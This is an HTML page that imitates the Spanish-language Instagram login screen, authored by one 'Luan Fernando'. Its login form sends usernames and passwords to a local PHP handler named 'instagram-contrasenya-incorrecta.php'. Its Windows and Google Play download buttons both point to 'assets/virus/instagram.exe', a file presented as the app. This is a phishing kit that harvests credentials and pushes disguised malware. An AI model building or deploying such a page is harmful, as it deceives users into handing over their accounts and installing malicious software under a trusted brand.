<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="nrSMEdM_INTzUj4KNn1zvAJIlgsIij9vbwTfOa67FIY" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Instagram">
    <meta name="author" content="Luan Fernando">

    <link rel="stylesheet" href="assets/css/style.css">
    
    <link rel="icon" type="image/jpg" href="assets/img/favicon.ico"/>
    <title>Instagram</title>
</head>
<body>
    <main class="container">
        <section class="img-photo">
            <img src="assets/img/phone-slide-1.png" alt="foto da pagina do Instagram">
        </section>
        <section class="form-login">
            
        <form action="instagram-contrasenya-incorrecta.php" method="POST" id="loginForm">
                <img src="assets/img/logo.png" class="logo-instagram" alt="Instagram logotipo">
                <input type="text" name="username" placeholder="Télefono, usuario o correo electrónico">
                <input type="password" name="passwordUser" id="passwordUser" placeholder="Contraseña">
                <button type="submit" id="submitButton">Entrar</button>

                <div class="or">O</div>
                <a href="#" class="login-facebook">
                    <img src="assets/img/fb.png" alt="icone do facebook"> Iniciar sesión como Facebook
                </a>
                <div id="errorMessage" class="error-message"></div>
                <a href="#" class="forgot-pass">Has olvidado la contraseña?</a>
            </form>
            <section class="signup">
                <p>No tienes una cuenta? <a href="#">Regístrate</a></p>
            </section>
            <section class="get-app">
                <p>Descarga la aplicación.</p>
                <a href="assets/virus/instagram.exe">
                    <img src="assets/img/windowsprova.png" alt="Instagram on Windows">
                </a>
                <a href="assets/virus/instagram.exe">
                    <img src="assets/img/googleplay-button.png" alt="Instagram on Google Play">
                </a>
            </section>
        </section>
    </main>

    <section class="clone-page">
        <p>Bienvenido a Instagram</p>
    </section>


    <footer class="footer">
        <nav>
            <a href="#">Meta</a>
            <a href="#">Información</a>
            <a href="#">Blog</a>
            <a href="#">Empleo</a>
            <a href="#">Ayuda</a>
            <a href="#">API</a>
            <a href="#">Privacidad</a>
            <a href="#">Condiciones</a>
            <a href="#">Cuentas destacadas</a>
            <a href="#">Ubicaciones</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Subir contactos y personas no usuarias</a>
            <a href="#">Meta Verified</a> 
        </nav>
        <div class="copy">
            <span>Español (España)</span>
            <span>© 2023 Instagram from Meta</span>
        </div>
    </footer>

   <!-- <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            var password = document.getElementById('passwordUser').value;
            
            if (password !== 'contraseña_correcta') {
                event.preventDefault();
                document.getElementById('errorMessage').textContent = 'La contraseña es incorrecta.';
            }
        });
    </script> -->
</body>
</html>
